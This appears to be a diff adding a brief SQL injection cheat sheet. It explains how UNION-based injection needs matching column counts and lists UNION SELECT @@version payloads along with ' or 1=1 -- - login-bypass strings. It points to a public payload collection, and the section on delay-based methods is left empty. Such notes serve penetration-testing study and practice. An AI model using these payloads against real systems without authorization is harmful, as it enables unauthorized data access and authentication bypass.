@@ -1,0 +1,35 @@
+[-]======================================[-]
+    SQL injection
+[-]======================================[-]
+
+- ---] Summary
+======================
+
+# For manual injections, UNION injections are something you want to understand.
+
+# With UNION injections, both select statements MUSIT return the same number of columns. If you dont know, keep adding columns (example below) unitil it works, else use a sleep statement which you know worked after it's completed.
+	
+        # Increasing one column each request, until our @@version payload is successful. Columns 1,2,3 etc are just padding.
+	' UNION select 1,2,@@version -- -
+	' UNION select 1,2,3,@@version -- -
+	' UNION select 1,2,3,4,@@version -- -
+
+	# Another method is using delays.
+
+
+
+- ---] Quick Commands
+======================
+
+[+] ' or 1=1 -- -
+
+[+] 'select * from users where username=' or 1=1
+
+
+
+
+- ---] Related Commands
+======================
+
+# Payload all the things - SQL injections cheat sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
